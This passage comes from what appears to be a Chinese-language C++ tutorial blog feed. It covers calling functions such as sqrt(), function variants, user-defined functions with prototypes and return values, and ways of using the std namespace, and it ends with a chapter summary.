Value)**。</p><p>我们已经使用过一些有返回值的函数，例如 C++ 标准库 <code>&lt;cmath&gt;</code> (或 C 语言的 <code>&lt;math.h&gt;</code>) 中提供的 <code>sqrt()</code> 函数，它计算一个数的平方根并返回结果。</p><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> 确保包含了提供该函数声明的头文件（例如 <code>&lt;cmath&gt;</code>）。</li><li> <strong>函数调用:</strong> 使用函数名，并在括号 <code>()</code> 内提供所需的**参数 (Argument)**（传递给函数的值）。</li><li> <strong>处理返回值:</strong> 函数调用本身就是一个表达式，其值就是函数的返回值。可以将这个返回值赋给变量、用在更复杂的表达式中或直接输出。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // 包含 cmath 头文件以使用 sqrt() 函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> area;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the floor area, in square feet, of your home: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; area; <span class="comment">// 读取用户输入的面积</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 sqrt() 函数，并将参数 area 传递给它</span></span><br><span class="line">    <span class="comment">// 函数的返回值 (area 的平方根) 被赋给变量 side</span></span><br><span class="line">    <span class="keyword">double</span> side = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(area); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;That&#x27;s the equivalent of a square &quot;</span> &lt;&lt; side </span><br><span class="line">              &lt;&lt; <span class="string">&quot; feet to the side.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以直接在输出语句中使用返回值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of 16 is: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">16</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值可以用在表达式中</span></span><br><span class="line">    <span class="keyword">double</span> hypotenuse = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">3.0</span> * <span class="number">3.0</span> + <span class="number">4.0</span> * <span class="number">4.0</span>); <span class="comment">// 计算直角三角形斜边</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hypotenuse of a 3-4 triangle: &quot;</span> &lt;&lt; hypotenuse &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::sqrt(area)</code>: 这是一个函数调用。<code>std::sqrt</code> 是函数名，<code>area</code> 是传递给函数的参数。</li><li>  <code>double side = ...</code>: <code>sqrt()</code> 函数返回一个 <code>double</code> 类型的值，这个值被用来初始化 <code>side</code> 变量。</li></ul><h3 id="2-4-2-函数变体"><a href="#2-4-2-函数变体" class="headerlink" title="2.4.2 函数变体"></a>2.4.2 函数变体</h3><p>函数可以有多种形式：</p><ol><li> <strong>有参数，有返回值:</strong> 如 <code>sqrt(double x)</code>，接收一个 <code>double</code> 参数，返回一个 <code>double</code> 值。</li><li> <strong>无参数，有返回值:</strong> 例如，某些库函数可能读取系统时间并返回一个值，不需要用户提供参数。</li><li> <strong>有参数，无返回值:</strong> 这种函数执行一个操作（如打印到屏幕），但不需要返回任何计算结果。这种函数的返回类型通常声明为 <code>void</code>。我们将在 2.4.3 节看到例子。</li><li> <strong>无参数，无返回值:</strong> 执行一个固定的操作，不接受输入参数也不返回结果，返回类型也是 <code>void</code>。</li></ol><p><strong>示例 (概念性):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // 为了 rand() 和 srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // 为了 time()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 1: 有参数，有返回值 (我们将在 2.4.4 定义自己的)</span></span><br><span class="line"><span class="comment">// double calculate_something(int input); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 2: 无参数，有返回值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRandomNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 C 标准库函数生成一个伪随机数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::rand() % <span class="number">100</span>; <span class="comment">// 返回 0-99 之间的随机数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 3: 有参数，无返回值 (我们将在 2.4.3 定义自己的)</span></span><br><span class="line"><span class="comment">// void printMessage(std::string msg); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例 4: 无参数，无返回值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showStartupMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program starting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化随机数生成器 (通常只需一次)</span></span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>)); </span><br><span class="line"></span><br><span class="line">    showStartupMessage(); <span class="comment">// 调用无参数、无返回值的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomNumber = getRandomNumber(); <span class="comment">// 调用无参数、有返回值的函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Random number: &quot;</span> &lt;&lt; randomNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用其他类型的函数 (假设已定义)</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Processing data...&quot;);</span></span><br><span class="line">    <span class="comment">// double result = calculate_something(10);</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-3-用户定义的函数"><a href="#2-4-3-用户定义的函数" class="headerlink" title="2.4.3 用户定义的函数"></a>2.4.3 用户定义的函数</h3><p>除了使用库函数，我们还可以定义自己的函数来执行特定任务。这有助于组织代码和重用代码。</p><p><strong>定义函数的基本结构:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterList)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体: 包含执行任务的语句</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 如果 returnType 不是 void，则需要 return 语句返回一个值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>returnType</code>: 函数执行完毕后返回的数据类型。如果函数不返回值，则使用 <code>void</code>。</li><li>  <code>functionName</code>: 你为函数选择的名称。</li><li>  <code>parameterList</code>: 函数接受的参数列表，包括每个参数的类型和名称。如果没有参数，括号 <code>()</code> 仍然需要，但内部为空。</li><li>  <code>&#123; ... &#125;</code>: 函数体，包含函数的代码。</li></ul><p><strong>函数原型 (Function Prototype):</strong></p><p>在使用函数之前，编译器需要知道函数的接口（返回类型、名称、参数列表）。通常将<strong>函数原型</strong>放在 <code>main()</code> 函数之前或单独的头文件中。原型看起来像函数头，但以分号 <code>;</code> 结尾，可以省略参数名。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterTypeList)</span></span>; <span class="comment">// 函数原型</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例 (定义一个无返回值的函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">// 声明 cheers 函数接受一个 int 参数，无返回值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter an integer: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; count;</span><br><span class="line">    </span><br><span class="line">    cheers(count); <span class="comment">// 函数调用：将 count 的值传递给 cheers 函数</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">// 定义 cheers 函数，参数名为 n</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cheers! &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 因为返回类型是 void，所以不需要 return 语句返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>原型:</strong> <code>void cheers(int n);</code> 告诉编译器 <code>main</code> 函数后面会定义一个名为 <code>cheers</code> 的函数。</li><li>  <strong>调用:</strong> <code>cheers(count);</code> 执行 <code>cheers</code> 函数的代码，并将 <code>count</code> 的值复制给 <code>cheers</code> 函数的参数 <code>n</code>（这称为<strong>按值传递</strong>）。</li><li>  <strong>定义:</strong> 提供了 <code>cheers</code> 函数的具体实现。</li></ul><h3 id="2-4-4-用户定义的有返回值的函数"><a href="#2-4-4-用户定义的有返回值的函数" class="headerlink" title="2.4.4 用户定义的有返回值的函数"></a>2.4.4 用户定义的有返回值的函数</h3><p>我们可以定义自己的函数来执行计算并返回结果。只需将 <code>returnType</code> 指定为期望的返回类型，并在函数体中使用 <code>return</code> 语句返回一个该类型的值。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型: 声明 cube 函数接受一个 double 参数，返回一个 double 值</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> side;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the side length of a cube: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; side;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> volume = cube(side); <span class="comment">// 调用 cube 函数，将返回值赋给 volume</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A cube with side &quot;</span> &lt;&lt; side &lt;&lt; <span class="string">&quot; has a volume of &quot;</span> </span><br><span class="line">              &lt;&lt; volume &lt;&lt; <span class="string">&quot; cubic units.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以直接使用返回值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The cube of 2.5 is &quot;</span> &lt;&lt; cube(<span class="number">2.5</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">cube</span><span class="params">(<span class="keyword">double</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">double</span> result = x * x * x;</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回计算结果 (类型必须与声明的返回类型 double 兼容)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 或者更简洁地：</span></span><br><span class="line">    <span class="comment">// return x * x * x; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>原型:</strong> <code>double cube(double x);</code> 声明了函数的接口。</li><li>  <strong>调用:</strong> <code>cube(side)</code> 调用函数，<code>side</code> 的值被传递给参数 <code>x</code>。函数执行后返回一个 <code>double</code> 值。</li><li>  <strong>定义:</strong> <code>double cube(double x)</code> 提供了函数的实现。<code>return result;</code> 将计算出的立方值返回给调用者。</li></ul><h3 id="2-4-5-在多函数程序中使用using编译指令"><a href="#2-4-5-在多函数程序中使用using编译指令" class="headerlink" title="2.4.5 在多函数程序中使用using编译指令"></a>2.4.5 在多函数程序中使用using编译指令</h3><p>当程序包含多个函数时，每个函数都需要访问 <code>std</code> 名称空间中的元素（如 <code>cout</code>, <code>cin</code>, <code>endl</code>）。有几种处理方式：</p><ol><li><strong>在每个函数中都使用 <code>std::</code> 前缀:</strong> 这是最安全的方式，尤其是在头文件中，但可能使代码冗长。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>在每个需要访问 <code>std</code> 的函数内部使用 <code>using</code> 声明或 <code>using namespace std;</code>:</strong> 这将 <code>using</code> 的作用域限制在函数内部，减少了命名冲突的风险。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// using 指令只在 func1 内部有效</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>; <span class="comment">// using 声明只引入 cin</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在 main 中也需要访问 std</span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line">    func1();</span><br><span class="line">    func2();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li> <strong>在所有函数定义之前（通常是在所有 <code>#include</code> 之后）放置一个 <code>using namespace std;</code> 指令:</strong> 这使得文件中的所有后续代码都可以直接使用 <code>std</code> 中的名称，无需 <code>std::</code> 前缀。<strong>这种方式最简单，但在大型项目中或编写头文件时不推荐，因为它可能引入全局命名冲突。</strong> 对于学习和小型项目，这通常是可接受的。</li></ol><p><strong>用法与示例 (全局 using 指令):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 using 指令放在所有函数之外</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> number = get_input(); <span class="comment">// 直接使用 get_input</span></span><br><span class="line">    print_sqrt(number);         <span class="comment">// 直接使用 print_sqrt</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program finished.&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 直接使用 cout 和 endl</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cannot calculate square root of a negative number.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">double</span> root = <span class="built_in">sqrt</span>(val); <span class="comment">// 直接使用 sqrt (来自 cmath, 已在 std 中)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> input_val;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>; <span class="comment">// 直接使用 cout</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; input_val;          <span class="comment">// 直接使用 cin</span></span><br><span class="line">    <span class="keyword">return</span> input_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择哪种方式取决于项目的规模和个人/团队的编码规范。对于初学者编写的简单多函数程序，将 <code>using namespace std;</code> 放在 <code>#include</code> 之后是一种常见的简化方法。</p><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><p>本章引导我们迈出了学习C++的第一步，涵盖了编写、编译和理解一个基本C++程序所需的 foundational concepts。</p><p>我们从C++程序的核心——<code>main()</code>函数开始，它是程序的入口点。了解了如何使用注释（<code>//</code> 和 <code>/* */</code>）来提高代码的可读性。接着，我们接触了C++预处理器，特别是 <code>#include</code> 指令，它用于包含头文件（如 <code>&lt;iostream&gt;</code>），这些头文件提供了函数和对象的声明。我们区分了标准库头文件（用 <code>&lt;&gt;</code>）和用户自定义头文件（用 <code>&quot;&quot;</code>）。</p><p>名称空间的概念被引入，特别是 <code>std</code> 名称空间，它包含了C++标准库的大部分内容。我们学习了访问 <code>std</code> 中元素的三种方式：使用 <code>std::</code> 前缀、<code>using</code> 声明和 <code>using</code> 编译指令，并讨论了它们的适用场景和潜在风险。</p><p>我们重点学习了如何使用 <code>iostream</code> 库中的 <code>cout</code> 对象和插入运算符 <code>&lt;&lt;</code> 来显示各种类型的数据（字符串、整数、浮点数等），以及如何使用 <code>endl</code> 或 <code>\n</code> 进行换行。代码格式化的重要性也被强调，以保证代码清晰、易于维护。</p><p>随后，我们学习了C++的基本语句类型。声明语句用于创建变量，指定其类型和名称，并可以选择在声明时进行初始化。赋值语句使用 <code>=</code> 运算符将值存储到变量中。我们还看到了 <code>cout</code> 如何智能地处理不同数据类型，以及如何通过链式调用 <code>&lt;&lt;</code> 来拼接输出。</p><p>输入操作通过 <code>cin</code> 对象和提取运算符 <code>&gt;&gt;</code> 实现，允许程序从用户那里读取数据并存储到变量中。</p><p>最后，我们初步探讨了函数。我们学习了如何调用库函数（如 <code>&lt;cmath&gt;</code> 中的 <code>sqrt()</code>）并使用它们的返回值。我们了解了函数的不同变体（有/无参数，有/无返回值）。更重要的是，我们学习了如何定义自己的函数，包括编写函数原型（声明）和函数定义（实现），以及如何通过函数调用来执行它们。我们还讨论了如何在包含多个函数的程序中管理 <code>std</code> 名称空间的使用。</p><p>通过本章的学习，我们已经能够编写简单的C++程序，实现基本的输入、处理和输出功能，并对C++程序的结构和一些核心概念有了初步的认识。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 10 对象和类</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_10/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_10/</url>
      
